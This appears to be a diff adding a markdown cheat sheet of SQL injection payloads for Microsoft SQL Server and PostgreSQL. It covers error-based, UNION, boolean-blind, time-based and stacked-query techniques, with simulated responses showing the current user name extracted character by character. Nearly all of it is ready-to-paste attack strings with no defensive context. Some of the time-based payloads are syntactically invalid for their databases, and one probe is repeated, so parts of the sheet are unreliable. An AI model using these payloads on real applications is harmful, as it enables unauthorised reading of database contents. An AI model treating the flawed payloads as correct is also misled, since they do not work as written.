@@ -1,0 +1,846 @@
+# Microsoft SQL Server
+
+## Error-based
+Force a type conversion error that includes the data in the error message for direct leakage.
+
+To retrieve version:
+' AND 1=CAST(@@version AS INT) --
+
+To retrieve current user:
+' AND 1=CAST(system_user AS INT) --
+
+## Union query-based
+Append UNION to combine results and extract data in columns.
+
+To retrieve version:
+' UNION SELECT NULL, @@version --
+
+To retrieve current user:
+' UNION SELECT NULL, system_user --
+
+## Boolean-based blind
+Use CASE statements to create true/false conditions, inferring from application behavior changes.
+
+To find length (binary search, assume 5):
+
+Check LEN(system_user)>16:
+' AND (CASE WHEN LEN(system_user)>16 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>8:
+' AND (CASE WHEN LEN(system_user)>8 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>4:
+' AND (CASE WHEN LEN(system_user)>4 THEN 1 ELSE 0 END)=1 --
+
+(True)
+
+>6:
+' AND (CASE WHEN LEN(system_user)>6 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>5:
+' AND (CASE WHEN LEN(system_user)>5 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+=5:
+' AND (CASE WHEN LEN(system_user)=5 THEN 1 ELSE 0 END)=1 --
+
+(True)
+
+To extract chars:
+
+Position 1 ('a'=97):
+
+ASCII(SUBSTRING(system_user,1,1))>109:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,1,1))>109 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>103:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,1,1))>103 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>100:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,1,1))>100 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>98:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,1,1))>98 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>97:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,1,1))>97 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+=97:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,1,1))=97 THEN 1 ELSE 0 END)=1 --
+
+(True)
+
+Position 2 ('d'=100):
+
+>109:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,2,1))>109 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>103:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,2,1))>103 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>100:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,2,1))>100 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>98:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,2,1))>98 THEN 1 ELSE 0 END)=1 --
+
+(True)
+
+>99:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,2,1))>99 THEN 1 ELSE 0 END)=1 --
+
+(True)
+
+=100:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,2,1))=100 THEN 1 ELSE 0 END)=1 --
+
+(True)
+
+Position 3 ('m'=109):
+
+>109:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,3,1))>109 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>103:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,3,1))>103 THEN 1 ELSE 0 END)=1 --
+
+(True)
+
+>106:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,3,1))>106 THEN 1 ELSE 0 END)=1 --
+
+(True)
+
+>108:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,3,1))>108 THEN 1 ELSE 0 END)=1 --
+
+(True)
+
+>109:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,3,1))>109 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+=109:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,3,1))=109 THEN 1 ELSE 0 END)=1 --
+
+(True)
+
+Position 4 ('i'=105):
+
+>109:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,4,1))>109 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>103:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,4,1))>103 THEN 1 ELSE 0 END)=1 --
+
+(True)
+
+>106:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,4,1))>106 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>104:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,4,1))>104 THEN 1 ELSE 0 END)=1 --
+
+(True)
+
+>105:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,4,1))>105 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+=105:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,4,1))=105 THEN 1 ELSE 0 END)=1 --
+
+(True)
+
+Position 5 ('n'=110):
+
+>109:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,5,1))>109 THEN 1 ELSE 0 END)=1 --
+
+(True)
+
+>116:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,5,1))>116 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>113:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,5,1))>113 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>111:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,5,1))>111 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+>110:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,5,1))>110 THEN 1 ELSE 0 END)=1 --
+
+(False)
+
+=110:
+' AND (CASE WHEN ASCII(SUBSTRING(system_user,5,1))=110 THEN 1 ELSE 0 END)=1 --
+
+(True)
+
+## Time-based blind
+Use WAITFOR DELAY to pause execution if condition is true, inferring from timed responses.
+
+Base test:
+' AND 1=1 WAITFOR DELAY '0:0:5' --
+
+To find length:
+
+>16:
+' AND CASE WHEN LEN(system_user)>16 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>8:
+' AND CASE WHEN LEN(system_user)>8 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>4:
+' AND CASE WHEN LEN(system_user)>4 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(Delay)
+
+>6:
+' AND CASE WHEN LEN(system_user)>6 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>5:
+' AND CASE WHEN LEN(system_user)>5 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+=5:
+' AND CASE WHEN LEN(system_user)=5 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(Delay)
+
+To extract chars:
+
+Position 1:
+
+>109:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,1,1))>109 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>103:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,1,1))>103 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>100:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,1,1))>100 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>98:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,1,1))>98 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>97:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,1,1))>97 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+=97:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,1,1))=97 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(Delay)
+
+Position 2:
+
+>109:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,2,1))>109 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>103:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,2,1))>103 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>100:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,2,1))>100 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>98:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,2,1))>98 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(Delay)
+
+>99:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,2,1))>99 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(Delay)
+
+=100:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,2,1))=100 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(Delay)
+
+Position 3:
+
+>109:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,3,1))>109 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>103:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,3,1))>103 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(Delay)
+
+>106:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,3,1))>106 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(Delay)
+
+>108:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,3,1))>108 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(Delay)
+
+>109:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,3,1))>109 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+=109:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,3,1))=109 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(Delay)
+
+Position 4:
+
+>109:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,4,1))>109 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>103:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,4,1))>103 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(Delay)
+
+>106:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,4,1))>106 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>104:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,4,1))>104 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(Delay)
+
+>105:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,4,1))>105 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+=105:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,4,1))=105 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(Delay)
+
+Position 5:
+
+>109:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,5,1))>109 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(Delay)
+
+>116:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,5,1))>116 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>113:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,5,1))>113 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>111:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,5,1))>111 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+>110:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,5,1))>110 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(No delay)
+
+=110:
+' AND CASE WHEN ASCII(SUBSTRING(system_user,5,1))=110 THEN WAITFOR DELAY '0:0:5' ELSE NULL END=1 --
+
+(Delay)
+
+## Stacked queries
+Chain multiple queries with semicolons to execute separate statements.
+
+To retrieve version:
+'; SELECT @@version --
+
+# PostgreSQL
+
+## Error-based
+Cast data to an incompatible type to force an error containing the data.
+
+To retrieve version:
+' AND 1=CAST(version() AS INT) --
+
+To retrieve current user:
+' AND 1=CAST(current_user AS INT) --
+
+## Union query-based
+Append UNION to extract data in result set.
+
+To retrieve version:
+' UNION SELECT NULL, version() --
+
+To retrieve current user:
+' UNION SELECT NULL, current_user --
+
+## Boolean-based blind
+Use conditions to alter response behavior for inference.
+
+To find length:
+
+LENGTH(current_user)>16:
+' AND (CASE WHEN LENGTH(current_user)>16 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>8:
+' AND (CASE WHEN LENGTH(current_user)>8 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>4:
+' AND (CASE WHEN LENGTH(current_user)>4 THEN TRUE ELSE FALSE END) --
+
+(True)
+
+>6:
+' AND (CASE WHEN LENGTH(current_user)>6 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>5:
+' AND (CASE WHEN LENGTH(current_user)>5 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+=5:
+' AND (CASE WHEN LENGTH(current_user)=5 THEN TRUE ELSE FALSE END) --
+
+(True)
+
+To extract chars:
+
+Position 1:
+
+ASCII(SUBSTR(current_user,1,1))>109:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,1,1))>109 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>103:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,1,1))>103 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>100:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,1,1))>100 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>98:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,1,1))>98 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>97:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,1,1))>97 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+=97:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,1,1))=97 THEN TRUE ELSE FALSE END) --
+
+(True)
+
+Position 2:
+
+>109:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,2,1))>109 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>103:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,2,1))>103 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>100:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,2,1))>100 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>98:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,2,1))>98 THEN TRUE ELSE FALSE END) --
+
+(True)
+
+>99:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,2,1))>99 THEN TRUE ELSE FALSE END) --
+
+(True)
+
+=100:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,2,1))=100 THEN TRUE ELSE FALSE END) --
+
+(True)
+
+Position 3:
+
+>109:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,3,1))>109 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>103:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,3,1))>103 THEN TRUE ELSE FALSE END) --
+
+(True)
+
+>106:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,3,1))>106 THEN TRUE ELSE FALSE END) --
+
+(True)
+
+>108:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,3,1))>108 THEN TRUE ELSE FALSE END) --
+
+(True)
+
+>109:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,3,1))>109 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+=109:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,3,1))=109 THEN TRUE ELSE FALSE END) --
+
+(True)
+
+Position 4:
+
+>109:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,4,1))>109 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>103:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,4,1))>103 THEN TRUE ELSE FALSE END) --
+
+(True)
+
+>106:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,4,1))>106 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>104:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,4,1))>104 THEN TRUE ELSE FALSE END) --
+
+(True)
+
+>105:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,4,1))>105 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+=105:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,4,1))=105 THEN TRUE ELSE FALSE END) --
+
+(True)
+
+Position 5:
+
+>109:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,5,1))>109 THEN TRUE ELSE FALSE END) --
+
+(True)
+
+>116:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,5,1))>116 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>113:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,5,1))>113 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>111:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,5,1))>111 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+>110:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,5,1))>110 THEN TRUE ELSE FALSE END) --
+
+(False)
+
+=110:
+' AND (CASE WHEN ASCII(SUBSTR(current_user,5,1))=110 THEN TRUE ELSE FALSE END) --
+
+(True)
+
+## Time-based blind
+Use pg_sleep to delay if true.
+
+Base:
+' AND pg_sleep(5) --
+
+To find length:
+
+>16:
+' AND CASE WHEN LENGTH(current_user)>16 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>8:
+' AND CASE WHEN LENGTH(current_user)>8 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>4:
+' AND CASE WHEN LENGTH(current_user)>4 THEN pg_sleep(5) ELSE 0 END --
+
+(Delay)
+
+>6:
+' AND CASE WHEN LENGTH(current_user)>6 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>5:
+' AND CASE WHEN LENGTH(current_user)>5 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+=5:
+' AND CASE WHEN LENGTH(current_user)=5 THEN pg_sleep(5) ELSE 0 END --
+
+(Delay)
+
+To extract:
+
+Position 1:
+
+>109:
+' AND CASE WHEN ASCII(SUBSTR(current_user,1,1))>109 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>103:
+' AND CASE WHEN ASCII(SUBSTR(current_user,1,1))>103 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>100:
+' AND CASE WHEN ASCII(SUBSTR(current_user,1,1))>100 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>98:
+' AND CASE WHEN ASCII(SUBSTR(current_user,1,1))>98 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>97:
+' AND CASE WHEN ASCII(SUBSTR(current_user,1,1))>97 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+=97:
+' AND CASE WHEN ASCII(SUBSTR(current_user,1,1))=97 THEN pg_sleep(5) ELSE 0 END --
+
+(Delay)
+
+Position 2:
+
+>109:
+' AND CASE WHEN ASCII(SUBSTR(current_user,2,1))>109 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>103:
+' AND CASE WHEN ASCII(SUBSTR(current_user,2,1))>103 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>100:
+' AND CASE WHEN ASCII(SUBSTR(current_user,2,1))>100 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>98:
+' AND CASE WHEN ASCII(SUBSTR(current_user,2,1))>98 THEN pg_sleep(5) ELSE 0 END --
+
+(Delay)
+
+>99:
+' AND CASE WHEN ASCII(SUBSTR(current_user,2,1))>99 THEN pg_sleep(5) ELSE 0 END --
+
+(Delay)
+
+=100:
+' AND CASE WHEN ASCII(SUBSTR(current_user,2,1))=100 THEN pg_sleep(5) ELSE 0 END --
+
+(Delay)
+
+Position 3:
+
+>109:
+' AND CASE WHEN ASCII(SUBSTR(current_user,3,1))>109 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>103:
+' AND CASE WHEN ASCII(SUBSTR(current_user,3,1))>103 THEN pg_sleep(5) ELSE 0 END --
+
+(Delay)
+
+>106:
+' AND CASE WHEN ASCII(SUBSTR(current_user,3,1))>106 THEN pg_sleep(5) ELSE 0 END --
+
+(Delay)
+
+>108:
+' AND CASE WHEN ASCII(SUBSTR(current_user,3,1))>108 THEN pg_sleep(5) ELSE 0 END --
+
+(Delay)
+
+>109:
+' AND CASE WHEN ASCII(SUBSTR(current_user,3,1))>109 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+=109:
+' AND CASE WHEN ASCII(SUBSTR(current_user,3,1))=109 THEN pg_sleep(5) ELSE 0 END --
+
+(Delay)
+
+Position 4:
+
+>109:
+' AND CASE WHEN ASCII(SUBSTR(current_user,4,1))>109 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>103:
+' AND CASE WHEN ASCII(SUBSTR(current_user,4,1))>103 THEN pg_sleep(5) ELSE 0 END --
+
+(Delay)
+
+>106:
+' AND CASE WHEN ASCII(SUBSTR(current_user,4,1))>106 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>104:
+' AND CASE WHEN ASCII(SUBSTR(current_user,4,1))>104 THEN pg_sleep(5) ELSE 0 END --
+
+(Delay)
+
+>105:
+' AND CASE WHEN ASCII(SUBSTR(current_user,4,1))>105 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+=105:
+' AND CASE WHEN ASCII(SUBSTR(current_user,4,1))=105 THEN pg_sleep(5) ELSE 0 END --
+
+(Delay)
+
+Position 5:
+
+>109:
+' AND CASE WHEN ASCII(SUBSTR(current_user,5,1))>109 THEN pg_sleep(5) ELSE 0 END --
+
+(Delay)
+
+>116:
+' AND CASE WHEN ASCII(SUBSTR(current_user,5,1))>116 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>113:
+' AND CASE WHEN ASCII(SUBSTR(current_user,5,1))>113 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>111:
+' AND CASE WHEN ASCII(SUBSTR(current_user,5,1))>111 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+>110:
+' AND CASE WHEN ASCII(SUBSTR(current_user,5,1))>110 THEN pg_sleep(5) ELSE 0 END --
+
+(No delay)
+
+=110:
+' AND CASE WHEN ASCII(SUBSTR(current_user,5,1))=110 THEN pg_sleep(5) ELSE 0 END --
+
+(Delay)
+
+## Stacked queries
+Use semicolon to run additional queries.
+
+To retrieve version:
+'; SELECT version() --
+
